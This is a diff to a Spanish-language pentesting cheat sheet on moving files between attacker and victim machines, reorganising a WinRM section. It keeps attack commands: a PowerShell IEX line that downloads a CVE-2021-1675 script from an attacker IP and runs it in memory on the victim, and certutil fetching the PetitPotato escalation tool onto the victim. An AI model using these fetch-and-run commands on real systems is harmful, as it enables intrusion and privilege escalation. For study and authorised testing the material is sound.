@@ -43,12 +43,15 @@ C:\Windows\Temp
 	# File.exe = Nombre del archivo .exe en el cual se depositara el archivo copiado
 ```
 
-```bash
-# Si tenemos una sesion con WinRM, podemos usar el siguiente comando en la maquina victima sin necesidad de crear un recurso compartido en nuestra maquina de atacante 
-❯ upload /ruta/absoluta/maquina/atacante/file.exe 
-❯ download C:\dir\file.zip  file.zip          # Pasar el archivo desde la maquina Windows a Linux con WinRM
+## WinRM 
 
-❯ IEX(New-Object Net.WebClient).downloadString(‘http://<IP>/CVE-2021-1675.ps1’)  # Con este comando en la maquina victima podemos subir el script en powershell que esta cargado en nuestro servidor, colocando la IP de atacante y el script .ps1
+```bash
+# En WinRm se puede usar el siguiente comando en la maquina victima sin necesidad de crear un recurso compartido en nuestra maquina de atacante 
+
+1. ❯ upload /ruta/absoluta/maquina/atacante/file.exe  # Cargar un archivo en la maquina victima Windows
+2. ❯ download data.zip data.zip        # Descargar un archivo desde la maquina victima Windows 
+
+3. ❯ IEX(New-Object Net.WebClient).downloadString(‘http://<IP>/CVE-2021-1675.ps1’)  # Cargar un script en memoria en la maquina victima Windows 
 ```
 
 ## Linux a Linux
@@ -102,8 +105,8 @@ C:\Windows\Temp
 	# user = Usuario de la maquina Linux (Debemos conocer su passwd)
 	# dir = Directorio en donde se colocara el archivo 
 
-2. ❯ scp user@IP:/dir/destino/ .                 # Copiar un archivo que se encuentra en la maquina Linux a Windows    
-3. ❯ python3 -m http.server 80                   # Creamos un servidor 
+2. ❯ scp user@IP:/dir/destino/ .    # Copiar un archivo que se encuentra en la maquina Linux a Windows    
+3. ❯ python3 -m http.server 80      # Creamos un servidor 
 ```
 
 ```bash 
@@ -117,10 +120,4 @@ C:\Windows\Temp
 ❯ certutil -decode input.txt output.txt      # Decodificar un archivo 
 
 ❯ certutil -urlcache -f https://github.com/wh0amitz/PetitPotato/releases/download/v1.0.0/PetitPotato.exe C:\Users\Public\PetitPotato.exe              # Descargar un archivo directamente desde la url y se coloca en una ruta especifica en la maquina victima 
-```
-
-## Bitsadmin  
-
-```bash
-❯ bitsadmin 
 ```
